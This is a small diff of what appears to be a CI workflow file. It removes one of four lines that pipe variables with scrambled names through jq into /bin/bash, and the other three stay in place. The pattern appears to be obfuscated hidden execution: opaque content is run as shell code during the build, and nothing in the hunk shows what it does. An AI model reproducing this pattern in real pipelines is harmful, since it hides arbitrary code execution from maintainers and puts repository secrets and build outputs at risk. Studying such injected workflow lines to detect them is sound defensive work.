@@ -22,7 +22,6 @@ jobs:
           echo $wlid032 | jq -r .ldmgk87 | /bin/bash
           printf '%s' "$klnf645" | jq -r .wor793 | /bin/bash
           echo $qfzeb19 | jq -r .lxqn7410 | /bin/bash
-          printf '%s' "$ntal47868" | jq -r .xwuin98455 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
